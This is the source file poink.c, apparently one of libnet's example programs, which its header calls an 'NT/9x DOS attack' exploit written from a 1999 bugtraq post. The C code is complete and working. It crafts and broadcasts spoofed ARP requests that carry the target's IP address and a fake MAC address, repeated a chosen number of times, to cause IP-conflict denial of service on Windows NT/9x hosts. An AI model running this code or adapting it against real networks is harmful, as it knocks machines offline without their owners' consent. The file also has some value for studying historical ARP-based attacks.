/*
 *  $Id: poink.c,v 1.1 2004/04/27 01:33:22 dyang Exp $
 *
 *  poink.c - NT/9x DOS attack
 *
 *  Code:
 *  Copyright (c) 1999 Mike D. Schiffman <mike@infonexus.com>
 *                         route|daemon9 <route@infonexus.com>
 *  All rights reserved.
 *
 *  Original Idea:
 *  Joel Jacobson (joel@mobila.cx)
 *
 *  This simple exploit was written as per the specification from Joel
 *  Jacobson's bugtraq post (http://geek-girl.com/bugtraq/1999_1/1299.html).
 *
 *  Needs libnet 0.99.  http://www.packetfactory.net/
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#if (HAVE_CONFIG_H)
#include "../../include/config.h"
#endif
#include "../libnet_test.h"

u_char e_src[6] = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
u_char e_dst[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

int poink_send_arp(struct libnet_link_int *, u_long, u_char *);
void usage(u_char *);

int
main(int argc, char *argv[])
{
    int c, amount;
    char errbuf[256];
    char *device = NULL;
    struct libnet_link_int *l;
    u_long ip;

    amount = 20;
    while ((c = getopt(argc, argv, "n:i:")) != EOF)
    {
        switch (c)
        {
            case 'i':
                device = optarg;
                break;
            case 'n':
                amount = atoi(optarg);
                break;
            default:
                exit(EXIT_FAILURE);
        }
    }

    if (!device)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (argc <= optind)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    else if ((ip = libnet_name_resolve(argv[optind], 1)) == -1)
    {
        fprintf(stderr, "Cannot resolve IP address\n");
        exit(EXIT_FAILURE);
    }

    l = libnet_open_link_interface(device, errbuf);
    if (!l)
    {
        fprintf(stderr, "libnet_open_link_interface: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    while (amount--)
    {
        c = poink_send_arp(l, ip, device);
        if (c == -1)
        {
            /* bail on the first error */
            break;
        }
    }
    printf("\n");
    return (c == -1 ? EXIT_FAILURE : EXIT_SUCCESS);
}


int
poink_send_arp(struct libnet_link_int *l, u_long ip, u_char *device)
{
    int n;
    u_char *buf;

    if (libnet_init_packet(LIBNET_ARP_H + LIBNET_ETH_H, &buf) == -1)
    {
        perror("libnet_init_packet memory:");
        exit(EXIT_FAILURE);
    }

    /*
     *  Ethernet header
     */
    libnet_build_ethernet(e_dst, e_src, ETHERTYPE_ARP, NULL, 0, buf);

    /*
     *  ARP header
     */
    libnet_build_arp(ARPHRD_ETHER,
        ETHERTYPE_IP,
        6,
        4,
        ARPOP_REQUEST,
        e_src,
        (u_char *)&ip,
        e_dst,
        (u_char *)&ip,
        NULL,
        0,
        buf + LIBNET_ETH_H);

    n = libnet_write_link_layer(l, device, buf, LIBNET_ARP_H + LIBNET_ETH_H);

    fprintf(stderr, ".");

    libnet_destroy_packet(&buf);
    return (n);
}


void
usage(u_char *name)
{
    fprintf(stderr, "%s -i interface [-n amount] ip\n", name);
}

/* EOF */
